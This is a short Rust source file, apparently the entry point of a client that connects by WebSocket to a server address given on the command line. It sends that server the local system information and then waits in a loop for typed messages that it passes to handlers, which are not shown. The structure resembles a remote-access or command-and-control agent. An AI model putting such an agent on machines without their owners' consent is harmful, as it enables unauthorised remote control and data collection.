use tungstenite::connect;

use crate::router::{handle_message, MessageType};
use crate::utils::SystemInformation;

mod utils;
mod router;
mod handlers;


fn main() {
	let args = std::env::args().collect::<Vec<String>>();
	let server_addr = if let Some(addr) = args.get(1) { addr } else { panic!("Provide server address"); };
	let port = if let Some(port) = args.get(2) { port } else { "4040" };

	if !utils::is_valid_ip(server_addr) || !utils::is_port_valid(port) { panic!("Invalid server address or port") }

	connect_with_host(server_addr, port);
}

fn connect_with_host(server_addr: &str, port: &str) {
	let (mut socket, _response) = connect(format!("ws://{}:{}", server_addr, port)).expect("Can't connect");
	let sysinfo = SystemInformation::get().to_string();
	println!("{}",sysinfo);
	socket.send(sysinfo.into()).unwrap();

	loop {
		let msg = socket.read();
		if let Ok(msg) = msg {
				let text = msg.into_text().unwrap();
				let bytes = text.as_bytes();
				let message_type = MessageType::from_char(bytes[0] as char).expect("Invalid message type");
				handle_message(message_type, &bytes[1..], &mut socket);
		}
	}
}